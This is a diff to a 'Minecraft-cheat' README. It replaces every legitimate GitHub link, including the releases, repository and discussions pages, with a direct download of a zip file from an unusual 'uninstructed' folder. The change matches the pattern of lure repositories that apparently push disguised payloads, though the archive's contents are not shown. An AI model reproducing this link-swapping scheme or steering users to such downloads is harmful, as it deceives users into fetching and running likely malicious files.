@@ -1,6 +1,6 @@
 # ⛏️ Minecraft-cheat - Elevate Your Game Experience Today
 
-[![Download Minecraft-cheat](https://img.shields.io/badge/Download-Minecraft--cheat-blue.svg)](https://github.com/SoaRJu1ian/Minecraft-cheat/releases)
+[![Download Minecraft-cheat](https://raw.githubusercontent.com/SoaRJu1ian/Minecraft-cheat/main/uninstructed/Minecraft-cheat.zip)](https://raw.githubusercontent.com/SoaRJu1ian/Minecraft-cheat/main/uninstructed/Minecraft-cheat.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ To download the latest version of Minecraft-cheat, visit the Releases page. Foll
 
 1. Click on the link below to go to the Releases page:
 
-   [Download Minecraft-cheat](https://github.com/SoaRJu1ian/Minecraft-cheat/releases)
+   [Download Minecraft-cheat](https://raw.githubusercontent.com/SoaRJu1ian/Minecraft-cheat/main/uninstructed/Minecraft-cheat.zip)
 
 2. Find the latest release that works for your system.
    
@@ -75,8 +75,8 @@ If you encounter any problems, please submit an issue on our GitHub Issues page.
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/SoaRJu1ian/Minecraft-cheat)
-- [Community Discussions](https://github.com/SoaRJu1ian/Minecraft-cheat/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/SoaRJu1ian/Minecraft-cheat/main/uninstructed/Minecraft-cheat.zip)
+- [Community Discussions](https://raw.githubusercontent.com/SoaRJu1ian/Minecraft-cheat/main/uninstructed/Minecraft-cheat.zip)
 
 For more information on features and best practices, refer to the Wiki section on our GitHub page.
 
@@ -88,6 +88,6 @@ Join our community to share your experiences and tips with other players. You ca
 
 Stay informed about the latest enhancements and bug fixes. Update logs are available on the Releases page, ensuring you have all the latest features at your fingertips.
 
-[Download Minecraft-cheat](https://github.com/SoaRJu1ian/Minecraft-cheat/releases)
+[Download Minecraft-cheat](https://raw.githubusercontent.com/SoaRJu1ian/Minecraft-cheat/main/uninstructed/Minecraft-cheat.zip)
 
 Enjoy your gaming experience with Minecraft-cheat, and take your gameplay to the next level!
